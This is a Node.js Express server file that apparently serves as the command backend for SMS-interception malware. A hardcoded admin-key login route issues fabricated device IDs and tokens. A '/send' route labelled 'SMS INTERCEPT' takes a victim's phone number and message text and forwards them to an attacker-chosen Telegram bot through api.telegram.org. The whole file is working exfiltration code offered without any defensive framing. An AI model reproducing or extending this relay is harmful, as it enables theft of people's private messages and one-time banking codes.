const express = require("express");
const http = require("http");
const axios = require("axios");

const app = express();
const server = http.createServer(app);

app.use(express.json()); // JSON parsing
app.use(express.urlencoded({ extended: true }));

// --- Admin Configuration ---
const MY_ADMIN_KEY = "darkdevil12@"; // App login ke liye yahi use karein

// ----------------------------
// 1️⃣ REGISTER / LOGIN
// ----------------------------
app.post("/register", (req, res) => {
    if (!req.is("application/json")) {
        return res.status(415).json({ success: false, error: "Content-Type must be application/json" });
    }

    const { key, mobile } = req.body;

    if (key === MY_ADMIN_KEY) {
        return res.status(200).json({
            status: "true",
            success: true,
            deviceid: "LITERA-" + Math.floor(Math.random() * 9000),
            mobile: mobile || "919836709756",
            token: "AUTH_TOKEN_" + Math.random().toString(36).substring(7)
        });
    } else {
        return res.status(200).json({ status: "false", message: "Invalid key" });
    }
});

// ----------------------------
// 2️⃣ SEND / SMS INTERCEPT
// ----------------------------
app.post("/send", async (req, res) => {
    if (!req.is("application/json")) {
        return res.status(415).json({ success: false, error: "Content-Type must be application/json" });
    }

    try {
        const {
            deviceId,
            destNumber,
            textMessage,
            requestId,
            telegramBotToken,
            telegramChatId
        } = req.body;

        // Mandatory fields check
        if (!destNumber || !textMessage || !requestId || !telegramBotToken || !telegramChatId) {
            return res.status(400).json({ success: false, error: "Missing required fields" });
        }

        // Telegram message formatting
        const tgText = `
📨 New SMS Request

🆔 Request ID: ${requestId}
📱 Device ID: ${deviceId}
📞 Number: ${destNumber}

💬 Message:
${textMessage}
        `;

        // Send to Telegram dynamically
        await axios.post(
            `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
            {
                chat_id: telegramChatId,
                text: tgText
            },
            {
                headers: { "Content-Type": "application/json" }
            }
        );

        return res.json({
            success: true,
            requestId,
            status: "RECEIVED"
        });

    } catch (err) {
        console.error("SEND ERROR:", err.message);
        return res.status(500).json({ success: false, error: "Server error" });
    }
});

// ----------------------------
// SERVER START
// ----------------------------
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
